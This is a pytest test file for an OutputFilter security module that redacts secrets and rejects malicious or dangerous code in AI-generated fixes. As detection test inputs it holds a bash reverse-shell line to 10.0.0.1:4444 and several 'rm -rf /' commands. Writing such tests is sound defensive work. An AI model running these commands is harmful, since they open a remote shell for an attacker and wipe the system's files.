"""
Unit tests for OutputFilter.
"""

import pytest
from pathlib import Path

from codetective.security.output_filter import OutputFilter, MaliciousCodeDetected


class TestOutputFilter:
    """Test cases for OutputFilter."""

    @pytest.mark.unit
    def test_filter_sensitive_data_api_key(self):
        """Test filtering API keys."""
        text = "api_key = 'sk_test_1234567890abcdefghij'"
        
        result = OutputFilter.filter_sensitive_data(text)
        
        assert "sk_test_" not in result
        assert "***REDACTED***" in result

    @pytest.mark.unit
    def test_filter_sensitive_data_password(self):
        """Test filtering passwords."""
        text = "password: MySecretPass123"
        
        result = OutputFilter.filter_sensitive_data(text)
        
        assert "MySecretPass123" not in result
        assert "***REDACTED***" in result

    @pytest.mark.unit
    def test_filter_sensitive_data_custom_redaction(self):
        """Test filtering with custom redaction text."""
        text = "secret_key = 'my_secret_12345678901234567890'"
        
        result = OutputFilter.filter_sensitive_data(text, redaction_text="[HIDDEN]")
        
        assert "my_secret_" not in result
        assert "[HIDDEN]" in result

    @pytest.mark.unit
    def test_detect_sensitive_data_none(self):
        """Test detecting no sensitive data."""
        text = "This is a safe message about code."
        
        has_sensitive, types = OutputFilter.detect_sensitive_data(text)
        
        assert has_sensitive is False
        assert len(types) == 0

    @pytest.mark.unit
    def test_detect_sensitive_data_api_key(self):
        """Test detecting API key."""
        text = "apikey='sk_live_abcdefghijklmnopqrst'"
        
        has_sensitive, types = OutputFilter.detect_sensitive_data(text)
        
        assert has_sensitive is True
        assert "api_key" in types

    @pytest.mark.unit
    def test_detect_sensitive_data_private_key(self):
        """Test detecting private key."""
        text = "-----BEGIN RSA PRIVATE KEY-----"
        
        has_sensitive, types = OutputFilter.detect_sensitive_data(text)
        
        assert has_sensitive is True
        assert "private_key" in types

    @pytest.mark.unit
    def test_detect_sensitive_data_jwt(self):
        """Test detecting JWT token."""
        text = "token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
        
        has_sensitive, types = OutputFilter.detect_sensitive_data(text)
        
        assert has_sensitive is True

    @pytest.mark.unit
    def test_detect_malicious_code_safe(self):
        """Test detecting no malicious code in safe code."""
        code = "def add(a, b):\n    return a + b"
        
        is_malicious, patterns = OutputFilter.detect_malicious_code(code)
        
        assert is_malicious is False
        assert len(patterns) == 0

    @pytest.mark.unit
    def test_detect_malicious_code_rm_rf(self):
        """Test detecting rm -rf command."""
        code = "os.system('rm -rf /')"
        
        is_malicious, patterns = OutputFilter.detect_malicious_code(code)
        
        assert is_malicious is True
        assert "rm_rf" in patterns

    @pytest.mark.unit
    def test_detect_malicious_code_reverse_shell(self):
        """Test detecting reverse shell."""
        code = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        
        is_malicious, patterns = OutputFilter.detect_malicious_code(code)
        
        assert is_malicious is True

    @pytest.mark.unit
    def test_detect_dangerous_functions_safe(self):
        """Test detecting no dangerous functions in safe code."""
        code = "def calculate(x):\n    return x * 2"
        
        has_dangerous, funcs = OutputFilter.detect_dangerous_functions(code)
        
        assert has_dangerous is False
        assert len(funcs) == 0

    @pytest.mark.unit
    def test_detect_dangerous_functions_eval(self):
        """Test detecting eval function."""
        code = "result = eval(user_input)"
        
        has_dangerous, funcs = OutputFilter.detect_dangerous_functions(code)
        
        assert has_dangerous is True
        assert "eval" in funcs

    @pytest.mark.unit
    def test_detect_dangerous_functions_exec(self):
        """Test detecting exec function."""
        code = "exec('print(1)')"
        
        has_dangerous, funcs = OutputFilter.detect_dangerous_functions(code)
        
        assert has_dangerous is True
        assert "exec" in funcs

    @pytest.mark.unit
    def test_detect_dangerous_functions_pickle(self):
        """Test detecting pickle usage."""
        code = "import pickle\ndata = pickle.loads(untrusted_data)"
        
        has_dangerous, funcs = OutputFilter.detect_dangerous_functions(code)
        
        assert has_dangerous is True
        assert "pickle" in funcs

    @pytest.mark.unit
    def test_validate_code_fix_safe(self):
        """Test validating safe code fix."""
        code = "def fixed_function():\n    return 'safe'"
        
        # Should not raise
        OutputFilter.validate_code_fix(code)

    @pytest.mark.unit
    def test_validate_code_fix_malicious(self):
        """Test rejecting malicious code fix."""
        code = "import os\nos.system('rm -rf /')"
        
        with pytest.raises(MaliciousCodeDetected, match="Malicious code"):
            OutputFilter.validate_code_fix(code)

    @pytest.mark.unit
    def test_validate_code_fix_dangerous_functions(self):
        """Test rejecting code with dangerous functions."""
        code = "result = eval(user_code)"
        
        with pytest.raises(MaliciousCodeDetected, match="Dangerous functions"):
            OutputFilter.validate_code_fix(code)

    @pytest.mark.unit
    def test_validate_code_fix_allow_dangerous(self):
        """Test allowing dangerous functions when explicitly permitted."""
        code = "result = eval(safe_expression)"
        
        # Should not raise when allowed
        OutputFilter.validate_code_fix(code, allow_dangerous_functions=True)

    @pytest.mark.unit
    def test_sanitize_log_message_basic(self):
        """Test sanitizing basic log message."""
        message = "Processing file: test.py"
        
        result = OutputFilter.sanitize_log_message(message)
        
        assert result == message

    @pytest.mark.unit
    def test_sanitize_log_message_with_api_key(self):
        """Test sanitizing log message with API key."""
        message = "Error: api_key='sk_test_1234567890abcdef' invalid"
        
        result = OutputFilter.sanitize_log_message(message)
        
        assert "sk_test_" not in result
        assert "***REDACTED***" in result

    @pytest.mark.unit
    def test_sanitize_log_message_with_home_path(self):
        """Test sanitizing log message with home directory path."""
        message = "File saved to /home/username/documents/file.txt"
        
        result = OutputFilter.sanitize_log_message(message)
        
        assert "/home/username" not in result
        assert "/home/***" in result

    @pytest.mark.unit
    def test_sanitize_log_message_with_windows_path(self):
        """Test sanitizing log message with Windows user path."""
        message = "File saved to C:\\Users\\JohnDoe\\Documents\\file.txt"
        
        result = OutputFilter.sanitize_log_message(message)
        
        assert "JohnDoe" not in result
        assert "C:\\Users\\***" in result

    @pytest.mark.unit
    def test_sanitize_file_path_basic(self, temp_dir):
        """Test sanitizing basic file path."""
        file_path = str(temp_dir / "test.py")
        
        result = OutputFilter.sanitize_file_path(file_path, project_root=str(temp_dir))
        
        assert result == "test.py"

    @pytest.mark.unit
    def test_sanitize_file_path_nested(self, temp_dir):
        """Test sanitizing nested file path."""
        file_path = str(temp_dir / "src" / "main.py")
        
        result = OutputFilter.sanitize_file_path(file_path, project_root=str(temp_dir))
        
        assert result == str(Path("src") / "main.py")

    @pytest.mark.unit
    def test_sanitize_file_path_outside_project(self):
        """Test sanitizing file path outside project root."""
        file_path = "/completely/different/path/file.py"
        
        result = OutputFilter.sanitize_file_path(file_path, project_root="/project")
        
        # Should return just the filename
        assert result == "file.py"

    @pytest.mark.unit
    def test_sanitize_ai_response_basic(self):
        """Test sanitizing basic AI response."""
        response = "The code looks good. No issues found."
        
        result = OutputFilter.sanitize_ai_response(response)
        
        assert result == response

    @pytest.mark.unit
    def test_sanitize_ai_response_with_sensitive_data(self):
        """Test sanitizing AI response with sensitive data."""
        response = "Found API key: api_key='sk_test_abcdefghij1234567890'"
        
        result = OutputFilter.sanitize_ai_response(response)
        
        assert "sk_test_" not in result
        assert "***REDACTED***" in result

    @pytest.mark.unit
    def test_sanitize_ai_response_excessive_newlines(self):
        """Test sanitizing AI response with excessive newlines."""
        response = "Line 1\n\n\n\n\nLine 2"
        
        result = OutputFilter.sanitize_ai_response(response)
        
        assert "\n\n\n" not in result
        assert result == "Line 1\n\nLine 2"

    @pytest.mark.unit
    def test_sanitize_ai_response_prompt_leakage(self):
        """Test sanitizing AI response removes prompt leakage."""
        response = "system:\nassistant:\nuser:\nActual response here"
        
        result = OutputFilter.sanitize_ai_response(response)
        
        # System/assistant/user labels at end of lines should be removed
        assert not result.strip().endswith("system:")
        assert not result.strip().endswith("assistant:")

    @pytest.mark.unit
    def test_validate_fix_output_reasonable_change(self):
        """Test validating fix with reasonable changes."""
        original = "def test():\n    x = 1\n    return x"
        fixed = "def test():\n    x = 2\n    return x"
        
        # Should not raise
        OutputFilter.validate_fix_output(original, fixed)

    @pytest.mark.unit
    def test_validate_fix_output_too_much_change(self):
        """Test rejecting fix that changes too much code."""
        original = "def test():\n    pass\n" * 10
        fixed = "completely different code\n" * 15
        
        with pytest.raises(ValueError, match="changes too much"):
            OutputFilter.validate_fix_output(original, fixed, max_change_ratio=0.5)

    @pytest.mark.unit
    def test_validate_fix_output_small_file(self):
        """Test that small files bypass change ratio check."""
        original = "x = 1"
        fixed = "y = 2"
        
        # Should not raise even though 100% changed (file too small)
        OutputFilter.validate_fix_output(original, fixed)

    @pytest.mark.unit
    def test_extract_code_from_markdown_single_block(self):
        """Test extracting code from markdown with single code block."""
        markdown = "Here is the code:\n```python\ndef test():\n    pass\n```"
        
        result = OutputFilter.extract_code_from_markdown(markdown)
        
        assert result == "def test():\n    pass"

    @pytest.mark.unit
    def test_extract_code_from_markdown_no_language(self):
        """Test extracting code from markdown without language specifier."""
        markdown = "```\ndef test():\n    pass\n```"
        
        result = OutputFilter.extract_code_from_markdown(markdown)
        
        assert result == "def test():\n    pass"

    @pytest.mark.unit
    def test_extract_code_from_markdown_no_blocks(self):
        """Test extracting code from markdown with no code blocks."""
        markdown = "This is just regular text without code blocks."
        
        result = OutputFilter.extract_code_from_markdown(markdown)
        
        assert result is None

    @pytest.mark.unit
    def test_extract_code_from_markdown_malicious(self):
        """Test that extracting malicious code raises error."""
        markdown = "```python\nimport os\nos.system('rm -rf /')\n```"
        
        with pytest.raises(MaliciousCodeDetected):
            OutputFilter.extract_code_from_markdown(markdown)

    @pytest.mark.unit
    def test_create_safe_output_basic(self):
        """Test creating safe output."""
        content = "This is safe content."
        
        result = OutputFilter.create_safe_output(content)
        
        assert result == content

    @pytest.mark.unit
    def test_create_safe_output_filters_sensitive(self):
        """Test creating safe output filters sensitive data."""
        content = "api_key = 'sk_test_1234567890abcdefghij'"
        
        result = OutputFilter.create_safe_output(content, filter_sensitive=True)
        
        assert "sk_test_" not in result
        assert "***REDACTED***" in result

    @pytest.mark.unit
    def test_create_safe_output_validates_code(self):
        """Test creating safe output validates as code."""
        malicious_code = "os.system('rm -rf /')"
        
        with pytest.raises(MaliciousCodeDetected):
            OutputFilter.create_safe_output(malicious_code, validate_code=True)

    @pytest.mark.unit
    def test_create_safe_output_safe_code(self):
        """Test creating safe output with valid code."""
        safe_code = "def test():\n    return 42"
        
        result = OutputFilter.create_safe_output(safe_code, validate_code=True)
        
        assert "def test" in result

    @pytest.mark.unit
    def test_sensitive_patterns_comprehensive(self):
        """Test that sensitive patterns cover common cases."""
        patterns = OutputFilter.SENSITIVE_PATTERNS
        
        # Should have patterns for common sensitive data
        assert "api_key" in patterns
        assert "password" in patterns
        assert "token" in patterns
        assert "private_key" in patterns

    @pytest.mark.unit
    def test_malicious_patterns_comprehensive(self):
        """Test that malicious patterns cover common threats."""
        patterns = OutputFilter.MALICIOUS_PATTERNS
        
        # Should have patterns for common malicious code
        assert "rm_rf" in patterns
        assert "backdoor" in patterns or "reverse_shell" in patterns

    @pytest.mark.unit
    def test_dangerous_functions_comprehensive(self):
        """Test that dangerous functions list is comprehensive."""
        funcs = OutputFilter.DANGEROUS_FUNCTIONS
        
        # Should include common dangerous functions
        assert "eval" in funcs
        assert "exec" in funcs
        assert "pickle" in funcs or "marshal" in funcs
